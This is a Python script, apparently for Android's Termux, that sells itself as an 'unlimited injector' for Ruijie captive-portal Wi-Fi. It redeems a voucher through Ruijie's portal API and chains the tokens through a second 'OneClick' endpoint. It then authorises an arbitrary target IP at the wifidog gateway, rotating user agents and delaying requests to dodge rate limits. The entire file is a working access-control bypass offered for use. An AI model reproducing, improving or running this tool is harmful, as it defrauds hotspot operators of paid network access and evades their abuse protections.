#!/usr/bin/env python3
# Ruijie Unlimited Injector - Termux Optimized
# No more "line" errors, no more "request limited"

import re, requests, os, sys, time, random, json
from urllib.parse import urlparse, parse_qs
import subprocess

# ---- Safe line function ----
def line():
    """Safe line function that works everywhere"""
    try:
        width = os.get_terminal_size()[0]
        if width > 200:
            width = 80
        print("━" * width)
    except:
        print("━" * 60)

# ---- Configuration ----
MAX_RETRIES = 3
RETRY_DELAY = 4
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/142.0.0.0 Mobile Safari/537.36',
]

def random_delay():
    time.sleep(random.uniform(1.0, 2.5))

def get_random_ua():
    return random.choice(USER_AGENTS)

# ---- Extract session ID from ANY Ruijie URL ----
def extract_session_id(url):
    """Extract sessionId from any Ruijie portal URL"""
    if not url:
        return None
    
    # Try query string first
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if 'sessionId' in params:
        return params['sessionId'][0]
    
    # Try regex on full URL
    match = re.search(r'sessionId=([a-zA-Z0-9]+)', url)
    if match:
        return match.group(1)
    
    # Try to get from redirect response
    try:
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        match = re.search(r'sessionId=([a-zA-Z0-9]+)', resp.url)
        if match:
            return match.group(1)
    except:
        pass
    
    return None

# ---- Login with voucher (with retry & delay) ----
def login_voucher(session_id, voucher, retry=0):
    if retry > MAX_RETRIES:
        return None
    
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 2
    }
    
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
        "user-agent": get_random_ua(),
        "x-requested-with": "XMLHttpRequest",
    }
    
    try:
        resp = requests.post(
            "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US",
            json=data,
            headers=headers,
            timeout=15
        )
        
        result = resp.json()
        
        # Check for rate limiting
        if "request limited" in str(result).lower():
            print(f"[!] Rate limited! Waiting {RETRY_DELAY * (retry + 1)}s...")
            time.sleep(RETRY_DELAY * (retry + 1))
            return login_voucher(session_id, voucher, retry + 1)
        
        if result.get('success') == True:
            token = result.get('data', {}).get('token')
            if token:
                return token
        
        token_match = re.search(r'token=([a-zA-Z0-9]+)', resp.text)
        if token_match:
            return token_match.group(1)
        
        if "Authentication failed" in resp.text or "expired" in resp.text:
            print(f"[!] Voucher {voucher} invalid or expired")
            return None
        
        return None
        
    except requests.exceptions.ConnectionError:
        print("[!] Connection error, retrying...")
        time.sleep(RETRY_DELAY)
        return login_voucher(session_id, voucher, retry + 1)
    except requests.exceptions.Timeout:
        print("[!] Timeout, retrying...")
        time.sleep(RETRY_DELAY)
        return login_voucher(session_id, voucher, retry + 1)
    except Exception as e:
        print(f"[!] Login error: {e}")
        return None

# ---- OneClick auth ----
def oneclick_auth(token, retry=0):
    if retry > MAX_RETRIES:
        return None
    
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
        "user-agent": get_random_ua(),
        "x-requested-with": "XMLHttpRequest",
    }
    
    json_data = {
        "phoneNumber": "",
        "sessionId": token,
    }
    
    try:
        resp = requests.post(
            "https://portal-as.ruijienetworks.com/api/auth/direct/?lang=en_US",
            headers=headers,
            json=json_data,
            timeout=15
        )
        
        result = resp.json()
        
        if "request limited" in str(result).lower():
            print(f"[!] Rate limited on OneClick! Waiting...")
            time.sleep(RETRY_DELAY * (retry + 1))
            return oneclick_auth(token, retry + 1)
        
        if result.get('success') == True:
            token2 = result.get('data', {}).get('token')
            if token2:
                return token2
        
        token_match = re.search(r'token=([a-zA-Z0-9]+)', resp.text)
        if token_match:
            return token_match.group(1)
        
        return None
        
    except Exception as e:
        print(f"[!] OneClick error: {e}")
        time.sleep(RETRY_DELAY)
        return oneclick_auth(token, retry + 1)

# ---- Auth to gateway ----
def auth_gateway(ip, token):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent': get_random_ua(),
        'Connection': 'keep-alive',
    }
    params = {'token': token, 'phoneNumber': ''}
    
    try:
        resp = requests.get(
            f'http://{ip}:2060/wifidog/auth',
            params=params,
            headers=headers,
            timeout=10,
            allow_redirects=False
        )
        
        if resp.status_code in [200, 302]:
            content = resp.text.lower()
            if 'success' in content or 'baidu.com' in content or 'ruijie' in content:
                return True
        
        return False
    except:
        return False

# ---- Get gateway IP automatically ----
def get_gateway_ip():
    try:
        result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "wlan" in line or "eth" in line:
                parts = line.split()
                if len(parts) > 2:
                    return parts[2]
    except:
        pass
    
    # Try alternative
    try:
        result = subprocess.run(["route", "-n"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if line.startswith("0.0.0.0"):
                parts = line.split()
                if len(parts) > 1:
                    return parts[1]
    except:
        pass
    
    return None

# ---- Main unlimited injection ----
def inject_unlimited(session_url, voucher, target_ip):
    print("\n[+] Starting unlimited injection...")
    line()
    
    # Step 1: Get valid session
    print("[1] Getting session ID...")
    session_id = extract_session_id(session_url)
    if not session_id:
        print("[!] Could not extract session ID from URL")
        print("[!] Trying to get from redirect...")
        session_id = extract_session_id(session_url + "&dummy=1")
    
    if not session_id:
        print("[!] Failed to get session ID")
        return False
    
    print(f"    Session ID: {session_id}")
    random_delay()
    
    # Step 2: Login with voucher
    print("[2] Authenticating voucher...")
    token1 = login_voucher(session_id, voucher)
    if not token1:
        print("[!] Voucher authentication failed")
        return False
    
    print(f"    Token1: {token1[:30]}...")
    random_delay()
    
    # Step 3: OneClick
    print("[3] OneClick authentication...")
    token2 = oneclick_auth(token1)
    if not token2:
        print("[!] OneClick failed")
        return False
    
    print(f"    Token2: {token2[:30]}...")
    random_delay()
    
    # Step 4: Gateway auth
    print("[4] Authenticating to gateway...")
    if auth_gateway(target_ip, token2):
        print("\n" + "="*50)
        print("  🎉 SUCCESS! Unlimited mode activated!")
        print(f"  Target IP: {target_ip}")
        print("="*50)
        return True
    else:
        print("[!] Gateway authentication failed")
        return False

# ---- Banner ----
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;36m")
    print("  ██╗  ██╗███████╗ █████╗ ███╗   ██╗ ██████╗")
    print("  ██║  ██║██╔════╝██╔══██╗████╗  ██║██╔════╝")
    print("  ███████║█████╗  ███████║██╔██╗ ██║██║  ███╗")
    print("  ██╔══██║██╔══╝  ██╔══██║██║╚██╗██║██║   ██║")
    print("  ██║  ██║██║     ██║  ██║██║ ╚████║╚██████╔╝")
    print("  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝")
    print("\033[1;34m     Unlimited Injector v4.1 - Termux Edition\033[0m")
    line()

# ---- CLI Entry ----
def main():
    try:
        show_banner()
    except:
        print("=== HFANG Unlimited Injector v4.1 ===")
        print("━" * 50)
    
    print("\033[1;33m[!] Enter the Session URL from browser:\033[0m")
    session_url = input("    > ").strip()
    
    if not session_url:
        print("\033[1;31m[!] Session URL required!\033[0m")
        return
    
    print("\n\033[1;33m[!] Enter Voucher Code:\033[0m")
    voucher = input("    > ").strip()
    
    if not voucher:
        print("\033[1;31m[!] Voucher required!\033[0m")
        return
    
    print("\n\033[1;33m[!] Enter Target Gateway IP (press Enter for auto-detect):\033[0m")
    target_ip = input("    > ").strip()
    
    if not target_ip:
        target_ip = get_gateway_ip()
        if target_ip:
            print(f"    Auto-detected: {target_ip}")
        else:
            print("\033[1;31m[!] Could not auto-detect. Please enter manually.\033[0m")
            target_ip = input("    > ").strip()
            if not target_ip:
                print("\033[1;31m[!] Gateway IP required!\033[0m")
                return
    
    line()
    
    # Run with retries
    success = False
    for attempt in range(1, MAX_RETRIES + 1):
        print(f"\n\033[1;33m[Attempt {attempt}/{MAX_RETRIES}]\033[0m")
        if inject_unlimited(session_url, voucher, target_ip):
            success = True
            break
        if attempt < MAX_RETRIES:
            print(f"\n[!] Retrying in {RETRY_DELAY} seconds...")
            time.sleep(RETRY_DELAY)
    
    if not success:
        print("\n\033[1;31m[!] All attempts failed. Possible reasons:")
        print("    - Voucher expired or invalid")
        print("    - Server blocking (try different VPN/proxy)")
        print("    - Target unreachable")
        print("    - Session URL incorrect\033[0m")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Cancelled by user\033[0m")
    except Exception as e:
        print(f"\n\033[1;31m[!] Fatal error: {e}\033[0m")
        print("[!] Please check your input and try again.")
